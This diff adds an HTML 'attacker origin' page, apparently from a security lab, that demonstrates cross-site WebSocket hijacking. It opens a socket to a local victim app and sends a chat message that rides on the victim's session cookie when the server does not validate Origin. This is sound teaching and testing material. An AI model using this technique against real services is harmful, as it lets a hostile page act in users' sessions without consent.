@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attack Page</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #3f0d12, #5b0e2d, #7f1d1d);
+      color: #fef2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 720px;
+      background: rgba(24, 24, 27, 0.92);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 22px;
+      padding: 28px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.35);
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 6px 12px;
+      border-radius: 999px;
+      background: rgba(239, 68, 68, 0.15);
+      color: #fca5a5;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      margin: 0 0 8px;
+      font-size: 32px;
+    }
+
+    p {
+      margin: 0 0 20px;
+      color: #fecaca;
+      line-height: 1.6;
+    }
+
+    .panel {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 16px;
+      padding: 18px;
+      margin-bottom: 16px;
+    }
+
+    .label {
+      font-size: 13px;
+      color: #fca5a5;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    .value {
+      font-size: 15px;
+      font-weight: 700;
+      word-break: break-word;
+    }
+
+    textarea {
+      width: 100%;
+      min-height: 110px;
+      padding: 14px;
+      border-radius: 14px;
+      border: 1px solid #7f1d1d;
+      background: #111827;
+      color: #fff7ed;
+      font-size: 15px;
+      resize: vertical;
+      outline: none;
+      margin-bottom: 14px;
+    }
+
+    textarea:focus {
+      border-color: #ef4444;
+      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.14);
+    }
+
+    .actions {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-bottom: 18px;
+    }
+
+    button {
+      border: none;
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      color: white;
+    }
+
+    .connect-btn {
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+    }
+
+    .send-btn {
+      background: linear-gradient(135deg, #f97316, #ea580c);
+    }
+
+    .close-btn {
+      background: linear-gradient(135deg, #475569, #334155);
+    }
+
+    #log {
+      background: #0b1120;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 16px;
+      padding: 14px;
+      height: 220px;
+      overflow-y: auto;
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      white-space: pre-wrap;
+      color: #e5e7eb;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="badge">Attacker Origin</div>
+    <h1>Cross-Site WebSocket Test Page</h1>
+    <p>
+      This page represents a foreign origin trying to open a WebSocket to the victim app.
+      In the vulnerable version, the victim server will accept the connection if the browser
+      sends the victim's session cookie and the server does not validate <code>Origin</code>.
+    </p>
+
+    <div class="panel">
+      <div class="label">Current origin</div>
+      <div class="value" id="originValue"></div>
+    </div>
+
+    <div class="panel">
+      <div class="label">Target WebSocket</div>
+      <div class="value">ws://localhost:3000/ws</div>
+    </div>
+
+    <div class="panel">
+      <div class="label">Attack payload</div>
+      <textarea id="payload">This message was sent from the attacker page.</textarea>
+
+      <div class="actions">
+        <button class="connect-btn" id="connectBtn">Connect</button>
+        <button class="send-btn" id="sendBtn">Send Attack Message</button>
+        <button class="close-btn" id="closeBtn">Close Socket</button>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="label">Log</div>
+      <div id="log"></div>
+    </div>
+  </div>
+
+  <script>
+    const originValue = document.getElementById('originValue');
+    const payloadInput = document.getElementById('payload');
+    const logEl = document.getElementById('log');
+    const connectBtn = document.getElementById('connectBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    const closeBtn = document.getElementById('closeBtn');
+
+    let socket = null;
+
+    originValue.textContent = window.location.origin;
+
+    function log(message) {
+      const time = new Date().toLocaleTimeString();
+      logEl.textContent += `[${time}] ${message}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function connectSocket() {
+      if (socket && socket.readyState === WebSocket.OPEN) {
+        log('Socket is already connected.');
+        return;
+      }
+
+      log('Trying to open WebSocket to ws://localhost:3000/ws ...');
+      socket = new WebSocket('ws://localhost:3000/ws');
+
+      socket.addEventListener('open', () => {
+        log('WebSocket opened successfully.');
+      });
+
+      socket.addEventListener('message', (event) => {
+        log(`Received: ${event.data}`);
+      });
+
+      socket.addEventListener('close', () => {
+        log('WebSocket closed.');
+      });
+
+      socket.addEventListener('error', () => {
+        log('WebSocket error occurred.');
+      });
+    }
+
+    function sendAttackMessage() {
+      if (!socket || socket.readyState !== WebSocket.OPEN) {
+        log('Cannot send. Socket is not open.');
+        return;
+      }
+
+      const payload = {
+        type: 'chat',
+        text: payloadInput.value
+      };
+
+      socket.send(JSON.stringify(payload));
+      log(`Sent payload: ${JSON.stringify(payload)}`);
+    }
+
+    function closeSocket() {
+      if (!socket) {
+        log('No socket to close.');
+        return;
+      }
+
+      socket.close();
+    }
+
+    connectBtn.addEventListener('click', connectSocket);
+    sendBtn.addEventListener('click', sendAttackMessage);
+    closeBtn.addEventListener('click', closeSocket);
+  </script>
+</body>
+</html>
